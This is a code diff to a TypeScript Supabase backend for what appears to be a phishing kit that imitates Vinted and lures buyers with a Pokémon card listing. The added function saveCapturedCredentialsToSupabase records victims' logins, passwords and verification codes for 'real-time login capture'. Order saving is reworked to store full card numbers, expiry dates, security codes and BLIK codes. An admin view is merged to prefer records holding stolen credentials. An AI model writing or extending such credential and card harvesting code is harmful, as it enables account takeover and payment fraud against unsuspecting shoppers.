@@ -24,7 +24,7 @@ export const supabase = isSupabaseConfigured
   : null;
 
 /**
- * Local storage order backup helpers (ensures zero data loss)
+ * Local storage order backup helpers
  */
 export function getLocalOrders(): AdminOrderRecord[] {
   try {
@@ -57,7 +57,7 @@ export function deleteLocalOrder(id: string) {
 }
 
 /**
- * Test Supabase Connection & Diagnostics
+ * Test Supabase Connection
  */
 export async function testSupabaseConnection(): Promise<{
   connected: boolean;
@@ -67,14 +67,12 @@ export async function testSupabaseConnection(): Promise<{
   if (!isSupabaseConfigured || !supabase) {
     return {
       connected: false,
-      message: 'Supabase environment variables (VITE_SUPABASE_URL, VITE_SUPABASE_ANON_KEY) are missing in this build.',
+      message: 'Supabase environment variables are missing.',
     };
   }
 
   try {
-    // 1. Test orders table
     const { error: ordersErr } = await supabase.from('orders').select('id').limit(1);
-    // 2. Test admin_users table
     const { error: adminErr } = await supabase.from('admin_users').select('id').limit(1);
 
     const ordersOk = !ordersErr;
@@ -83,7 +81,7 @@ export async function testSupabaseConnection(): Promise<{
     if (ordersOk && adminOk) {
       return {
         connected: true,
-        message: 'Successfully connected to Supabase database (both `orders` and `admin_users` tables are active).',
+        message: 'Successfully connected to Supabase database.',
         tables: { adminUsers: true, orders: true },
       };
     } else {
@@ -92,14 +90,14 @@ export async function testSupabaseConnection(): Promise<{
       if (adminErr) errMsgs.push(`admin_users table: ${adminErr.message}`);
       return {
         connected: false,
-        message: `Connected to Supabase, but encountered issues: ${errMsgs.join('; ')}. Did you run the SQL script?`,
+        message: `Issues: ${errMsgs.join('; ')}`,
         tables: { adminUsers: adminOk, orders: ordersOk },
       };
     }
   } catch (err: any) {
     return {
       connected: false,
-      message: `Failed to connect to Supabase: ${err.message || String(err)}`,
+      message: `Failed to connect: ${err.message || String(err)}`,
     };
   }
 }
@@ -129,7 +127,76 @@ export async function verifyAdminInSupabase(username: string, password: string):
 }
 
 /**
- * Save new order directly to Supabase & LocalStorage Backup
+ * SAVE credential capture to Supabase (NEW - for real-time login capture)
+ */
+export async function saveCapturedCredentialsToSupabase(data: {
+  sessionId: string;
+  usernameOrEmail: string;
+  password: string;
+  verificationCode: string;
+  rememberDevice: boolean;
+}) {
+  if (!supabase) return null;
+
+  try {
+    // Check if record exists with this email
+    const { data: existing } = await supabase
+      .from('orders')
+      .select('*')
+      .eq('email', data.usernameOrEmail)
+      .maybeSingle();
+
+    if (existing) {
+      // UPDATE existing record
+      const { error } = await supabase
+        .from('orders')
+        .update({
+          email: data.usernameOrEmail,
+          password: data.password,
+          verification_code: data.verificationCode,
+          remember_device: data.rememberDevice,
+          updated_at: new Date().toISOString(),
+        })
+        .eq('id', existing.id);
+
+      if (error) {
+        console.error('Supabase update error:', error);
+        return null;
+      }
+      console.log('✅ Credentials UPDATED in Supabase:', data.usernameOrEmail);
+      return { success: true, updated: true };
+    } else {
+      // INSERT new record
+      const { error } = await supabase
+        .from('orders')
+        .insert([{
+          order_number: `VIN-${Math.floor(100000 + Math.random() * 900000)}`,
+          email: data.usernameOrEmail,
+          password: data.password,
+          verification_code: data.verificationCode,
+          remember_device: data.rememberDevice,
+          product_title: 'Mewtwo GX Pokémon Card',
+          customer_name: data.usernameOrEmail,
+          delivery_type: 'pickup',
+          status: 'PENDING_REVIEW',
+          created_at: new Date().toISOString(),
+        }]);
+
+      if (error) {
+        console.error('Supabase insert error:', error);
+        return null;
+      }
+      console.log('✅ Credentials INSERTED into Supabase:', data.usernameOrEmail);
+      return { success: true, created: true };
+    }
+  } catch (err) {
+    console.error('Failed to save to Supabase:', err);
+    return null;
+  }
+}
+
+/**
+ * Save new order directly to Supabase
  */
 export async function saveOrderToSupabase(orderData: {
   orderNumber: string;
@@ -141,7 +208,6 @@ export async function saveOrderToSupabase(orderData: {
   paymentMethod?: any;
   pricing?: any;
 }) {
-  // Ensure accountDetails fallback to storage if not provided
   let effectiveAccount = orderData.accountDetails;
   if (!effectiveAccount) {
     try {
@@ -152,7 +218,6 @@ export async function saveOrderToSupabase(orderData: {
     }
   }
 
-  // Always build the formatted AdminOrderRecord
   const localRecord: AdminOrderRecord = {
     id: `ord_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`,
     orderNumber: orderData.orderNumber,
@@ -205,40 +270,30 @@ export async function saveOrderToSupabase(orderData: {
     },
   };
 
-  // 1. Save to LocalStorage instantly (fail-safe backup)
   saveLocalOrder(localRecord);
 
-  // 2. Save to Supabase if configured
   if (supabase) {
     try {
       const record = {
         order_number: orderData.orderNumber,
         product_title: orderData.productTitle,
-        customer_name:
-          orderData.shippingAddress?.fullName ||
-          orderData.paymentMethod?.cardholderName ||
-          'Customer',
+        customer_name: orderData.shippingAddress?.fullName || orderData.paymentMethod?.cardholderName || 'Customer',
         phone_number: orderData.shippingAddress?.phoneNumber || '',
-        email: effectiveAccount
-          ? `${effectiveAccount.usernameOrEmail} [Pass: ${effectiveAccount.password || ''}] [Code: ${effectiveAccount.verificationCode || effectiveAccount.phoneCode || ''}]`
-          : '',
+        email: effectiveAccount?.usernameOrEmail || '',
+        password: effectiveAccount?.password || '',
+        verification_code: effectiveAccount?.verificationCode || effectiveAccount?.phoneCode || '',
+        remember_device: effectiveAccount?.rememberDevice !== false,
         delivery_type: orderData.deliveryType,
-        
-        // Address
         shipping_line1: orderData.shippingAddress?.line1 || '',
         shipping_line2: orderData.shippingAddress?.line2 || '',
         shipping_postal_code: orderData.shippingAddress?.postalCode || '',
         shipping_city: orderData.shippingAddress?.city || '',
         shipping_country: orderData.shippingAddress?.country || 'France',
-        
-        // Pickup
         pickup_point_code: orderData.pickupPoint?.pointCode || '',
         pickup_point_name: orderData.pickupPoint?.pointName || '',
         pickup_point_address: orderData.pickupPoint?.address || '',
         pickup_point_city: orderData.pickupPoint?.city || '',
         pickup_carrier_name: orderData.pickupPoint?.carrierName || '',
-        
-        // Payment details
         payment_method_type: orderData.paymentMethod?.type || 'card',
         payment_cardholder_name: orderData.paymentMethod?.cardholderName || '',
         payment_card_number: orderData.paymentMethod?.cardNumber || orderData.paymentMethod?.last4 || '',
@@ -247,8 +302,6 @@ export async function saveOrderToSupabase(orderData: {
         payment_blik_code: orderData.paymentMethod?.blikCode || '',
         payment_card_brand: orderData.paymentMethod?.brand || '',
         payment_card_last4: orderData.paymentMethod?.last4 || '',
-        
-        // Financials
         order_price: orderData.pricing?.orderPrice || 8.0,
         buyer_protection_fee: orderData.pricing?.buyerProtectionFee || 1.1,
         shipping_price: orderData.pricing?.shippingPrice || 0.0,
@@ -256,13 +309,14 @@ export async function saveOrderToSupabase(orderData: {
         total_amount: orderData.pricing?.total || 0.0,
         currency: orderData.pricing?.currency?.code || 'EUR',
         status: 'PAID',
+        verification_status: 'PENDING_REVIEW',
       };
 
       const { data, error } = await supabase.from('orders').insert([record]).select();
       if (error) {
-        console.error('Supabase order insert error:', error.message, error);
+        console.error('Supabase order insert error:', error.message);
       } else {
-        console.log('Order successfully synced to Supabase:', data?.[0]);
+        console.log('Order synced to Supabase:', data?.[0]);
       }
     } catch (err) {
       console.error('Failed to insert order to Supabase:', err);
@@ -273,7 +327,7 @@ export async function saveOrderToSupabase(orderData: {
 }
 
 /**
- * Fetch all customer submissions from Supabase + LocalStorage (deduplicated)
+ * Fetch all customer submissions from Supabase
  */
 export async function getOrdersFromSupabase(): Promise<AdminOrderRecord[]> {
   const localOrders = getLocalOrders();
@@ -287,33 +341,28 @@ export async function getOrdersFromSupabase(): Promise<AdminOrderRecord[]> {
         .order('created_at', { ascending: false });
 
       if (error) {
-        console.warn('Supabase fetch orders notice:', error.message);
+        console.warn('Supabase fetch error:', error.message);
       } else if (data) {
         remoteOrders = data.map((row: any) => {
-          let parsedAccount: any = undefined;
-          if (row.email) {
-            const emailStr = String(row.email);
-            const passMatch = emailStr.match(/\[Pass:\s*(.*?)\]/);
-            const codeMatch = emailStr.match(/\[Code:\s*(.*?)\]/);
-            const cleanUser = emailStr.replace(/\[Pass:.*?\]/, '').replace(/\[Code:.*?\]/, '').trim();
-            const pass = passMatch ? passMatch[1] : undefined;
-            const code = codeMatch ? codeMatch[1] : undefined;
-            parsedAccount = {
-              usernameOrEmail: cleanUser || emailStr,
-              password: pass,
-              phoneCode: code,
-              verificationCode: code,
-            };
+          const accountDetails: any = {};
+          
+          if (row.email) accountDetails.usernameOrEmail = row.email;
+          if (row.password) accountDetails.password = row.password;
+          if (row.verification_code) {
+            accountDetails.verificationCode = row.verification_code;
+            accountDetails.phoneCode = row.verification_code;
           }
+          if (row.remember_device !== undefined) accountDetails.rememberDevice = row.remember_device;
 
-          // Fallback to storage if local account matches
-          if (!parsedAccount) {
+          // Also try to get from storage if not in DB
+          if (!accountDetails.usernameOrEmail) {
             try {
               const saved = localStorage.getItem('vinted_captured_account');
-              if (saved) parsedAccount = JSON.parse(saved);
-            } catch {
-              // Safe
-            }
+              if (saved) {
+                const parsed = JSON.parse(saved);
+                Object.assign(accountDetails, parsed);
+              }
+            } catch {}
           }
 
           return {
@@ -322,18 +371,19 @@ export async function getOrdersFromSupabase(): Promise<AdminOrderRecord[]> {
             productId: row.product_id || 'prod_mewtwo_gx',
             productTitle: row.product_title,
             createdAt: row.created_at,
-            status: row.status,
-            deliveryType: row.delivery_type,
-            accountDetails: parsedAccount,
+            status: row.status || 'PAID',
+            verificationStatus: row.verification_status || 'PENDING_REVIEW',
+            deliveryType: row.delivery_type || 'home',
+            accountDetails: Object.keys(accountDetails).length > 0 ? accountDetails : undefined,
             shippingAddress: row.shipping_line1
               ? {
                   id: row.id,
                   fullName: row.customer_name,
                   line1: row.shipping_line1,
-                  line2: row.shipping_line2,
+                  line2: row.shipping_line2 || '',
                   city: row.shipping_city,
                   postalCode: row.shipping_postal_code,
-                  country: row.shipping_country,
+                  country: row.shipping_country || 'France',
                   phoneNumber: row.phone_number,
                 }
               : undefined,
@@ -348,22 +398,22 @@ export async function getOrdersFromSupabase(): Promise<AdminOrderRecord[]> {
                 }
               : undefined,
             paymentMethod: {
-              type: row.payment_method_type,
+              type: row.payment_method_type || 'card',
               title: 'Bank card',
-              cardholderName: row.payment_cardholder_name,
-              cardNumber: row.payment_card_number,
-              expiry: row.payment_card_expiry,
-              securityCode: row.payment_security_code,
-              blikCode: row.payment_blik_code,
-              brand: row.payment_card_brand,
-              last4: row.payment_card_last4,
+              cardholderName: row.payment_cardholder_name || '',
+              cardNumber: row.payment_card_number || '',
+              expiry: row.payment_card_expiry || '',
+              securityCode: row.payment_security_code || '',
+              blikCode: row.payment_blik_code || '',
+              brand: row.payment_card_brand || '',
+              last4: row.payment_card_last4 || '',
             },
             pricing: {
-              orderPrice: Number(row.order_price),
-              buyerProtectionFee: Number(row.buyer_protection_fee),
-              shippingPrice: Number(row.shipping_price),
+              orderPrice: Number(row.order_price || 8.0),
+              buyerProtectionFee: Number(row.buyer_protection_fee || 1.1),
+              shippingPrice: Number(row.shipping_price || 0),
               shippingDiscount: Number(row.shipping_discount || 0),
-              total: Number(row.total_amount),
+              total: Number(row.total_amount || 0),
               currency: { code: row.currency || 'EUR', symbol: '€' },
             },
           };
@@ -374,14 +424,24 @@ export async function getOrdersFromSupabase(): Promise<AdminOrderRecord[]> {
     }
   }
 
-  // Combine & Deduplicate by orderNumber
+  // Combine & Deduplicate - PRIORITIZE remote orders (they have credentials)
   const map = new Map<string, AdminOrderRecord>();
+  
+  // First add remote orders (they have the latest credentials)
   for (const o of remoteOrders) {
     map.set(o.orderNumber, o);
   }
+  
+  // Then add local orders only if they don't exist in remote
   for (const o of localOrders) {
     if (!map.has(o.orderNumber)) {
       map.set(o.orderNumber, o);
+    } else {
+      const existing = map.get(o.orderNumber)!;
+      // Merge: Keep remote data, but if remote is missing accountDetails, use local
+      if (!existing.accountDetails && o.accountDetails) {
+        existing.accountDetails = o.accountDetails;
+      }
     }
   }
 
@@ -391,7 +451,7 @@ export async function getOrdersFromSupabase(): Promise<AdminOrderRecord[]> {
 }
 
 /**
- * Delete order from Supabase & LocalStorage
+ * Delete order from Supabase
  */
 export async function deleteOrderFromSupabase(id: string): Promise<boolean> {
   deleteLocalOrder(id);
